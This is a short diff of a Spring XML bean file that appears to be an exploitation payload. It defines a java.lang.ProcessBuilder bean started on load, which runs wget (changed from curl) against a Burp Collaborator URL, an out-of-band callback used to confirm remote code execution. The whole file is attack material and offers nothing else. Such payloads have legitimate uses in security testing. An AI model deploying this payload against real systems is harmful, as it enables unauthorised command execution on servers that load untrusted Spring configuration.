@@ -2,7 +2,7 @@
   <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
     <constructor-arg>
       <list>
-        <value>curl</value>
+        <value>wget</value>
         <value>https://xwxpo6p0zkehwnl51zu18upey54vsk.burpcollaborator.net</value>
       </list>
     </constructor-arg>
